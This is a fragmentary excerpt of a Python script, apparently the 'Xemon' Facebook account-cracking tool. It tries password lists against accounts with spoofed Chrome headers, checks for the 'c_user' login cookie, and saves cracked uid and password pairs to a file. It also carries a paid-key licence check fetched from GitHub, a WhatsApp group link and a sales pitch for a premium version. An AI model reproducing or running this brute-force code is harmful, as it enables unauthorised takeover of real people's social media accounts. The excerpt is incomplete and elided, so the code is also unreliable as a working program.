...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        input("Press enter to back Xemon Menu ")
        exit()
os.system("xd-open https://chat.whatsapp.com/BB55VxwCx6nGYaI1Dn92u5")
def menu():   
    os.system('clear')
    print(logo)
        ...
        for ps in pwx:
          ...
          'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Google Chrome";v="130", "Chromium";v="130"',
            ...
            'sec-fetch-site': 'none',
             ...
             'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6791.63 Safari/537.36',
    '.        viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[xemon🍬-OK] '+cid+' | '+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[xemon-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('xemon-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;92m[Xemon]\033[1;92m] %s|\33[1;31m[OK]:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass 
############            
...
def main_apv():
    ...
    print(logo)
    uuid = str(os.geteuid())
    Xyteee=('Xemon1x6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
    print(logo)
    os.system("clear");print(logo)
    print(f" Your Key : \x1b[1;31m"+Xyteee)
    print("\x1b[1;92m--------------------------------------------------")
    try:
        system = requests.get("https://github.com/Gojosaturo100pro/xemon/blob/main/xemon.txt").text 
        if Xyteee in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
            ...
            print('\033[1;92m[\033[1;92m•\033[1;92m]\033[1;92m Notes : Nix Xemon Can buy in all countries!')
            print('\033[1;92m-----------------------------------------------------\033[1;97m')
            ...
            tks = ("Hi XEMON Sir, I Need To Buy Your xemon Tools Version 0.10 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
